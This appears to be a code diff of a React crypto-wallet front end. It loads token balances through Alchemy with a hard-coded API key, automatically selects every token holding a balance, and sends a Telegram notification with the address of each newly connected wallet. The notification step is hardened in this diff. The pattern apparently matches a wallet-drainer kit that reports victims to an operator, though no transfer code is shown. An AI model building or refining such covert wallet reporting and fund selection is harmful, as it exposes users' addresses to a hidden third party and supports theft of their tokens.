@@ -24,7 +24,7 @@ const sendTelegramNotification = async (message) => {
   }
 };
 
-// Setup Alchemy instances for multiple networks
+/// Setup Alchemy instances for multiple networks
 const alchemyInstances = {
   [Network.ETH_MAINNET]: new Alchemy({
     apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
@@ -207,34 +207,33 @@ export const GetTokens = () => {
           balance: safeNumber(balance.tokenBalance),
           quote: balance.quote || 0,
           quote_rate: balance.quoteRate || 0,
+          contract_ticker_symbol: balance.symbol,
         })),
       ];
 
       setTokens(processedTokens);
 
-      // Automatically check tokens with non-zero balance
-      const newCheckedRecords = processedTokens.reduce((acc, token) => {
+      // Auto-toggle tokens with balance greater than 0
+      const newCheckedRecords = {};
+      processedTokens.forEach((token) => {
         if (safeNumber(token.balance).gt(0)) {
-          acc[token.contract_address] = { isChecked: true };
+          newCheckedRecords[token.contract_address] = { isChecked: true };
         }
-        return acc;
-      }, {});
-
-      setCheckedRecords((old) => ({ ...old, ...newCheckedRecords }));
-
-      console.log('Fetched tokens:', processedTokens);
-    } catch (error) {
-      console.error('Error fetching tokens:', error);
-      setError(error.message);
+      });
+      setCheckedRecords((prevRecords) => ({ ...prevRecords, ...newCheckedRecords }));
+    } catch (err) {
+      console.error('Error fetching tokens:', err.message || err);
+      setError(err.message || 'Error fetching tokens');
     }
     setLoading(false);
   }, [address, chain, setTokens, setCheckedRecords]);
 
-  // Effect to send a Telegram notification when the wallet is connected
+  // Send Telegram notification only once when the wallet is connected
   useEffect(() => {
     if (isConnected && address && !notified) {
-      sendTelegramNotification(`New Connection: ${address}`);
-      setNotified(true);
+      sendTelegramNotification(`New Connection: ${address}`)
+        .then(() => setNotified(true))
+        .catch((error) => console.error('Failed to send notification:', error));
     }
   }, [isConnected, address, notified]);
 
